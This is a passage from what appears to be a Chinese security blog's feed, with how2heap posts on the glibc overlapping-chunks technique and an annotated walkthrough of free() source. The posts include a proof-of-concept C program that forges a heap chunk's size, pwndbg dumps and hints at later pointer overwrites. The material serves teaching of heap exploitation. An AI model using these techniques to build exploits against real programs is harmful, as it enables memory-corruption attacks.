class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line"><span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">assert(<span class="built_in">strstr</span>((<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p3));</span><br></pre></td></tr></table></figure><p>放到题目来说简单来说就是 free 掉 p3 堆块让其放入 fastbin 或 tcachebin 中，然后修改 fd 或 next 指针，然后…你懂的。</p><h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>为什么要在堆块 free 进入 unsortedbin 后在修改堆块的大小，不能 free 之前修改吗？<br>首先我们写个例子看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p3=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p4=<span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//avoid top_chunk</span></span><br><span class="line"><span class="keyword">int</span> fake_size=<span class="number">0x581</span>;</span><br><span class="line">*(p2<span class="number">-0x1</span>)=fake_size;<span class="comment">//VULNERABILITY</span></span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="keyword">void</span> *p5=<span class="built_in">malloc</span>(<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc 编译更改 p2 堆块的 mchunk_size：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">270</span>gx <span class="number">0x555555756000</span></span><br><span class="line"><span class="number">0x555555756000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555756250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #p1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555756260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000581</span> #p2(<span class="built_in">malloc</span>)</span><br><span class="line">       #<span class="number">0x0000000000000501</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555756770</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span> #p3(<span class="built_in">malloc</span>)</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555756800</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #p4(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555756810</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756820</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000207e1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555756860</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们引入源码到此处：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620483761861-8cf51a33-a5b2-409d-b051-64dcc187e6d2.png#clientId=u4fa999d8-1604-4&from=drop&id=uf8befcb2&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-08%2022.22.38.png&originHeight=732&originWidth=1688&originalType=binary&size=240995&status=done&style=none&taskId=u06959663-5041-416c-93bb-f5532693432" alt="截屏2021-05-08 22.22.38.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   nextchunk = chunk_at_offset(p, size);</span><br><span class="line"><span class="comment">//nextchunk==0x555555756270+0x580==0x5555557567f0</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line">   <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))  <span class="comment">//这里会检查到，如下图</span></span><br><span class="line">       <span class="comment">//prev_inuse(nextchunk)==0</span></span><br><span class="line">     malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620484422849-1e63ea89-7c1f-40b0-8874-a446fd31189a.png#clientId=u4fa999d8-1604-4&from=drop&id=u7ca055a5&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-08%2022.33.39.png&originHeight=636&originWidth=2744&originalType=binary&size=137942&status=done&style=none&taskId=u7a406ba5-9278-4b86-977d-0db1c21307b" alt="截屏2021-05-08 22.33.39.png"><br>这里在计算后 nextchunk 地址为 0x5555557567f0，会将这里当作堆块的起始地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x5555557567f0</span></span><br><span class="line"><span class="number">0x5555557567f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">    #mchunk_prev_size#mchunk_size</span><br><span class="line"><span class="number">0x555555756800</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555756810</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756820</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000207e1</span></span><br><span class="line"><span class="number">0x555555756830</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756840</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756850</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756860</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>很明显堆块的 prev_inuse(nextchunk)==0，所以会触发异常：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620484708023-674fb95e-db38-448e-a97d-760a898976b4.png#clientId=u4fa999d8-1604-4&from=drop&id=u281ed4ed&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-08%2022.38.23.png&originHeight=1800&originWidth=2880&originalType=binary&size=489505&status=done&style=none&taskId=ue546d2a6-f3cc-4126-b101-537167a4459" alt="截屏2021-05-08 22.38.23.png"><br>深究其原因是因为大小更改的不恰当所致，程序改成这样就好可以了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">intptr_t</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p2=<span class="built_in">malloc</span>(<span class="number">0x500</span> - <span class="number">8</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *p3=<span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>); <span class="comment">//intptr_t *p3=malloc(0x80);</span></span><br><span class="line"><span class="keyword">intptr_t</span> *p4=<span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//avoid top_chunk</span></span><br><span class="line"><span class="keyword">int</span> fake_size=<span class="number">0x581</span>;</span><br><span class="line">*(p2<span class="number">-0x1</span>)=fake_size;<span class="comment">//VULNERABILITY</span></span><br><span class="line"><span class="built_in">free</span>(p2);</span><br><span class="line"><span class="keyword">void</span> *p5=<span class="built_in">malloc</span>(<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终效果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">270</span>gx <span class="number">0x555555756000</span></span><br><span class="line"><span class="number">0x555555756000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555756250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #p1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555756260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000581</span> #p2(<span class="built_in">malloc</span>)--------</span><br><span class="line">       #<span class="number">0x0000000000000501</span> |</span><br><span class="line"><span class="number">0x555555756280</span>:<span class="number">0x00007ffff7dcdca0</span><span class="number">0x00007ffff7dcdca0</span> |</span><br><span class="line">...... |--实际控制范围</span><br><span class="line"><span class="number">0x555555756770</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000081</span> #p3(<span class="built_in">malloc</span>)       |</span><br><span class="line">...... |</span><br><span class="line"><span class="number">0x5555557567e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span>--------------------</span><br><span class="line"><span class="number">0x5555557567f0</span>:<span class="number">0x0000000000000580</span><span class="number">0x0000000000000021</span> #p4(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555756800</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756810</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000207f1</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555756860</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555756000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555756250</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555756270</span></span><br><span class="line">Size: <span class="number">0x581</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555557567f0</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555756810</span></span><br><span class="line">Size: <span class="number">0x207f1</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>和 POC 中的效果相同。</p><h1 id="利用与总结"><a href="#利用与总结" class="headerlink" title="利用与总结"></a>利用与总结</h1><p>这种利用方式虽然简单，但是要注意更改 mchunk_size 在 free 之前和之后的检查时不一样的；<br>建议在 exp 的最后几步使用，因为更改 size 是件危险的事，一不注意就会触发 malloc_printerr（异常）。<br><strong>mchunk_size 一定要改正确啊！！！</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(5)-free源码解读（非mmap）</title>
    <link href="https://cyberangel.cn/2021/04/29/how2heap(5)-free%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%EF%BC%88%E9%9D%9Emmap%EF%BC%89/"/>
    <id>https://cyberangel.cn/2021/04/29/how2heap(5)-free%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%EF%BC%88%E9%9D%9Emmap%EF%BC%89/</id>
    <published>2021-04-29T07:51:05.000Z</published>
    <updated>2021-07-04T09:57:12.046Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li>主要针对点：单线程</li></ul><h1 id="libc-free-源码"><a href="#libc-free-源码" class="headerlink" title="__libc_free 源码"></a>__libc_free 源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem) <span class="comment">//传入要释放堆块的指针</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="comment">//以上都是关于__free_hook的代码</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)  <span class="comment">//free(0)会直接在这里返回</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//省略释放由mmap分配堆块的代码......</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE (); <span class="comment">//检查是否初始化了tcache，如果没有初始化则初始化</span></span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);  <span class="comment">//获取对应的arena地址，在单线程中为main_arena</span></span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>); <span class="comment">//调用_int_free</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><h1 id="int-free-源码"><a href="#int-free-源码" class="headerlink" title="_int_free 源码"></a>_int_free 源码</h1><p>首先说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x555555756250</span></span><br><span class="line"><span class="number">0x555555756250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000021</span> #前一个堆块：chunk    （前）</span><br><span class="line"><span class="number">0x555555756260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555756010</span></span><br><span class="line"><span class="number">0x555555756270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span> <span class="meta">#p</span></span><br><span class="line"><span class="number">0x555555756280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756290</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557562a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000041</span> #后一个堆块：nextchunk（后）</span><br><span class="line"><span class="number">0x5555557562b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557562c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ free ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123; <span class="comment">//此函数传入的参数分别为main_arena，待释放堆块的指针，和锁have_lock</span></span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  size = chunksize (p); <span class="comment">//获取待释放堆块的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>) <span class="comment">//检查堆块指针的有效性</span></span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid pointer&quot;</span>);</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) <span class="comment">//检查堆块的大小是否合法</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;free(): invalid size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"> <span class="comment">//关于tcachebin的代码在这里省略，因为之前说过......</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast ())</span><br><span class="line">    <span 